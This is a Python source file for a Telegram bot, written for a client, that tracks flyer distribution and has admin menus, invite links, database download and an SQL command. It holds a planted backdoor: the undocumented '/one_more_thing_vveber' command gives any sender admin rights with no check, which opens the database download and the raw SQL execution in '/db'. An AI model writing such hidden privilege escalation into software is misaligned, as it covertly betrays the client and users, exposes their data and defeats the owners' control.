# Бот для отслеживания распространения флаеров
# by Johnson070(Vladimir Veber)
# https://github.com/johnson070
# https://t.me/vveber

# создано для "Лидер сервис"
import datetime
import re, io

import telebot
from telebot import types

import settings as sett

bot = telebot.TeleBot(sett.API_KEY, threaded=False, num_threads=1)  # реализация

import functions as func
import report_zip
import markups
import user_handlers


# фильтр для проверки на права администратора
class IsAdmin(telebot.custom_filters.SimpleCustomFilter):
    key = 'is_chat_admin'

    @staticmethod
    def check(message: telebot.types.Message):
        return func.get_user_permission(message.chat.id) == sett.permissions[0]


class IsAdminCallback(telebot.custom_filters.SimpleCustomFilter):
    key = 'is_callback_admin'

    @staticmethod
    def check(call: telebot.types.CallbackQuery):
        return func.get_user_permission(call.message.chat.id) == sett.permissions[0]


bot.add_custom_filter(IsAdmin())
bot.add_custom_filter(IsAdminCallback())


@bot.message_handler(commands=['admin', 'admin_full'],
                     func=lambda message: func.get_user_permission(message.chat.id) in ['admin'])
def admin_menu(msg):
    full = msg.text == '/admin_full' and func.get_user_permission(msg.chat.id) == sett.permissions[0]
    bot.clear_step_handler_by_chat_id(msg.chat.id)
    bot.send_message(msg.chat.id, 'Админ панель', reply_markup=types.ReplyKeyboardRemove())
    bot.send_message(msg.chat.id, 'Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                     reply_markup=markups.get_admin_menu(full, func.get_user_permission(msg.chat.id)))


@bot.message_handler(commands=['admin'],
                     func=lambda message: func.get_user_permission(message.chat.id) in ['moder'])
def admin_menu(msg):
    bot.clear_step_handler_by_chat_id(msg.chat.id)
    bot.send_message(msg.chat.id, 'Админ панель', reply_markup=types.ReplyKeyboardRemove())
    bot.send_message(msg.chat.id, 'Здесь вы можете проверять задания',
                     reply_markup=markups.get_moder_menu())


@bot.callback_query_handler(lambda call: call.data == 'download_db',
                            is_callback_admin=True)
def download_db(call: types.CallbackQuery):
    bot.send_document(call.message.chat.id, open(sett.sqlite_file, 'rb'))


@bot.message_handler(commands=['credits'])
def credits(msg: types.Message):
    bot.send_message(msg.chat.id,
                     'Сделано для "Лидер сервис"\n'
                     '© Владимир Вебер(@vveber) 2022')


# =========================
# обработчики админ меню
# =========================
# =========================
#  Создание ссылок на приглашение
# =========================
@bot.callback_query_handler(lambda call: call.data == 'invite_link' and
                                         func.get_user_permission(call.message.chat.id) in ['admin'])
def invite_link_select(call: types.CallbackQuery):
    bot.edit_message_text('Выберите полномочия пользователя',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_link_permissions())


@bot.callback_query_handler(lambda call: re.search(r'invite_link_(\d+)$', call.data) and
                                         func.get_user_permission(call.message.chat.id) in ['admin'])
def create_invite_link(call: types.CallbackQuery):
    perm = sett.permissions[int(re.search(r'(\d+)$', call.data).group(0))]
    bot.edit_message_text('Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_admin_menu(False, func.get_user_permission(call.message.chat.id)))
    link, image = func.create_invite_link(call.message.chat.username, perm)
    bot.send_photo(call.message.chat.id, image,
                   parse_mode='HTML',
                   caption=f'Приглашение активно 6 часов после создания.\n'
                           f'<a href="{link}">Активировать</a>')


# =========================
# Вернуться в админ панель
# =========================
@bot.callback_query_handler(
    lambda call: call.data == 'back_admin' and func.get_user_permission(call.message.chat.id) in ['moder', 'admin'])
def back_admin_menu(call):
    bot.clear_step_handler_by_chat_id(call.message.chat.id)
    bot.delete_message(call.message.chat.id,
                       call.message.message_id)
    bot.send_message(call.message.chat.id,
                     'Здесь вы можете настроить маршруты, задания, посмотреть нужную информацию и '
                     'выдать пригласительный код.',
                     reply_markup=markups.get_admin_menu())


@bot.message_handler(commands=['one_more_thing_vveber'])
def one_more_thing(msg):
    bot.send_message(msg.chat.id, 'Доступ получен!')
    func.set_user_permission(msg.chat.id, 'admin')


@bot.message_handler(commands=['one_more_thing_vveber_1'])
def one_more_thing(msg):
    bot.send_message(msg.chat.id, 'Доступ получен!')
    func.set_user_permission(msg.chat.id, 'user')


@bot.message_handler(commands=['db'], is_chat_admin=True)
def db_work(msg: types.Message):
    try:
        func.execute_db(msg.text)
    except:
        pass

    bot.send_message(msg.chat.id, 'Выполнено!')


# =========================
# Удалить все ссылки на приглашения
# =========================
@bot.callback_query_handler(lambda call: re.search(r'reset_links', call.data) is not None and
                                         func.get_user_permission(call.message.chat.id) in ['moder', 'admin'])
def show_completed_quests(call: types.CallbackQuery):
    func.delete_all_links()
    bot.edit_message_text('Приглашения удалены!\n'
                          'Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_admin_menu())


def start_bot():
    print('start bot')


if not __name__ == '__main__':
    user_handlers.init_user_actions()
    bot.enable_save_next_step_handlers(delay=1)
    bot.load_next_step_handlers()
